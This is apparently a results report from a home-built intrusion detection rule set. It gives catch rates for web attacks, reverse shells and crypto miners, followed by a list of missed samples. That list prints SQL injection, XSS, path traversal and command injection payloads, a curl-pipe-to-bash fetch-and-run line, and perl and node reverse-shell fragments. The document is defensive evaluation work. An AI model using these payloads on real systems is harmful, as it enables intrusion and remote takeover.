# Round 2 held-out evaluation (offline)

Made by `python3 eval/heldout_round2.py` on 2026-11-22. Rules were NOT changed for this run.

**How to read the Set column.** `dev-2` = the built-in round-2 samples: they were run once untuned (see ROUND2_BEFORE_TUNING.md: SQLi 64%, XSS 92%, traversal 78%, command injection 57%), then the rules were fixed for their misses, so they are now DEVELOPMENT samples and their numbers are optimistic. Any other set name (e.g. `round3`, `teammate`) = samples from that folder that no rule was tuned on: those are the honest numbers. Samples written by the rule author are not independent; `teammate` (written by someone who never read the rules) is the independent one. For BENIGN rows lower is better. Small hand-written sets, no network traffic.

| Set | Area | Class | Samples | Caught / wrong | Note |
|---|---|---|---|---|---|
| dev-2 | web | SQL injection | 50 | 49 (98%) | 45 would block on that single request |
| dev-2 | web | XSS | 50 | 50 (100%) | 0 would block on that single request |
| dev-2 | web | Path traversal | 50 | 50 (100%) | 50 would block on that single request |
| dev-2 | web | Command injection / log4shell | 51 | 51 (100%) | 51 would block on that single request |
| dev-2 | web | BENIGN requests | 81 | 0 | 0 would BLOCK a visitor on one request (must be 0) |
| dev-2 | web | BENIGN 404/403 and admin-login pages | 5 | 0 | scored 10+ points (must be 0) |
| dev-2 | host | Reverse shells (with a remote connection) | 26 | 25 (96%) | killed |
| dev-2 | host | Crypto miners | 16 | 16 (100%) | killed |
| dev-2 | host | BENIGN processes | 40 | 0 | wrongly killed (must be 0) |
| round3 | web | SQL injection | 30 | 24 (80%) | 21 would block on that single request |
| round3 | web | XSS | 30 | 26 (87%) | 1 would block on that single request |
| round3 | web | Path traversal | 30 | 28 (93%) | 28 would block on that single request |
| round3 | web | Command injection / log4shell | 31 | 30 (97%) | 29 would block on that single request |
| round3 | web | BENIGN requests | 47 | 1 | 1 would BLOCK a visitor on one request (must be 0) |
| round3 | host | Reverse shells | 16 | 14 (88%) | killed |
| round3 | host | Crypto miners | 12 | 11 (92%) | killed |
| round3 | host | BENIGN processes | 38 | 0 | wrongly killed (must be 0) |

## Misses and false positives (printed, not hidden)

- dev-2 web SQL injection not flagged: /a?id=1' AND 1=CAST((SELECT version()) AS INT)--
- dev-2 host reverse shell not caught: curl http://198.51.100.7/s.sh | bash
- round3 web SQL injection not flagged: /profile?u=bob") OR ("1"="1
- round3 web SQL injection not flagged: /list?sort=name,(SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)
- round3 web SQL injection not flagged: /cat?id=3 AND ORD(MID((SELECT user()),1,1))>50
- round3 web SQL injection not flagged: /cat?id=3 AND substring(version(),1,1)=5
- round3 web SQL injection not flagged: /cat?id=1 EXEC sp_configure 'show advanced options',1
- round3 web SQL injection not flagged: /api/users?filter=name eq 'a' or 1 eq 1
- round3 web XSS not flagged: /page?t=<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>x</a>
- round3 web XSS not flagged: /page?t='-alert(1)-'
- round3 web XSS not flagged: /page?t=\"-alert(1)}//
- round3 web XSS not flagged: /page?t=<scr%00ipt>alert(1)</scr%00ipt>
- round3 web Path traversal not flagged: /get?name=C:/Windows/System32/config/SAM
- round3 web Path traversal not flagged: /get?name=..%u2216..%u2216etc%u2216passwd
- round3 web Command injection / log4shell not flagged: /ping?host=;ruby -e 'system("id")'
- round3 web BENIGN flagged (10 points): /p?comment=5+%3C+10+and+10+%3E+5
- round3 host Reverse shells not caught: perl -MIO -e $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,'203.0.113.20:9999');STDIN->fdopen
- round3 host Reverse shells not caught: node -e sh=require('child_process').spawn('/bin/sh');require('net').connect(9999,'203.0.113.20',func
- round3 host Crypto miners not caught: ./srbminer-multi --algorithm randomx --pool x:1
